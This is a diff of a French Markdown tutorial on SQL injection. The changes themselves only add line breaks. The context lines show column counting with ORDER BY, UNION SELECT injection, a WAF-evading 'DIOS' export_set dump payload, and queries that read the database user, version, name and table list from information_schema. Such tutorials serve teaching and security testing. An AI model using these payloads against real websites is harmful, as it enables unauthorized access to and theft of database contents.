@@ -163,14 +163,15 @@ Dans l'url ça donne ça:<br/><br/>
 <br/><br/>
 • J'utilise ``+`` pour remplacer les espaces, c'est plus lisible qu'avoir des ``%20`` partout.<br/>
 • Pour connaître le nombre de sélections on va utiliser ``ORDER BY``. La commande ``ORDER BY`` permet de trier les lignes dans un résultat d’une requête SQL.
-On peut aussi utiliser la commande ``GROUP BY``. Elle est utilisée pour grouper plusieurs résultats et utiliser une fonction de totaux sur un groupe de résultat.<br/>
+On peut aussi utiliser la commande ``GROUP BY``. Elle est utilisée pour grouper plusieurs résultats et utiliser une fonction de totaux sur un groupe de résultat.<br/><br/>
 ![image](https://user-images.githubusercontent.com/74382279/159136013-292fac1d-2d97-4395-88fa-5a07251685c4.png)
+<br/><br/>
 • On obtient une erreur, donc il n'y a pas 3 sélections.<br/><br/>
 ![image](https://user-images.githubusercontent.com/74382279/159136046-84fc0649-c1a2-415a-a862-7b183d47bcd9.png)
 <br/><br/>
 • A partir de 2 sélections il n'y a plus d'erreur, on peut donc utiliser ``UNION SELECT`` pour avoir notre point d'entrée.<br/>
 ![image](https://user-images.githubusercontent.com/74382279/159136155-c4f63ffb-a4d8-45bc-9f03-789b74edb976.png)
-<br/>
+<br/><br/>
 • Si on remplace la deuxième sélection par une commande ``DIOS`` (Dump in one shot). Ce DIOS  utiliser est utilise contre les WAF qui bloquent concat.<br/><br/>
 ```sql
 (SELECT export_set(5,@:=0,(SELECT count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))
@@ -181,14 +182,14 @@ On peut aussi utiliser la commande ``GROUP BY``. Elle est utilisée pour grouper
 Si on formatte la requête ça donne ça:<br/>
 ![image](https://user-images.githubusercontent.com/74382279/159136320-3bdbb668-65bc-4d2b-9354-0f686ef566b1.png)
 <br/>
-• Maintenant si je veux afficher la version de la BDD MySQL, l'username et l'hostname de la session MySQL et le nom de la BDD. J'exécute la requête suivante:
+• Maintenant si je veux afficher la version de la BDD MySQL, l'username et l'hostname de la session MySQL et le nom de la BDD. J'exécute la requête suivante:<br/>
 ```sql
 UNION SELECT NULL,CONCAT_WS(" | ",user(),version(),database())--+-
 ```
 <br/><br/>
 ![image](https://user-images.githubusercontent.com/74382279/159135842-efa9684e-24e5-4299-b907-2498353465d2.png)
 <br/><br/>
-• Et là c'est le moment où je vais bâcler ce paper car j'ai la flemme de faire 42 recherches pour vous expliquer des trucs accessibles.
+• Et là c'est le moment où je vais bâcler ce paper car j'ai la flemme de faire 42 recherches pour vous expliquer des trucs accessibles.<br/>
 • Pour extraire les tables de la BDD je fais: 
 ```sql
 UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema=database();
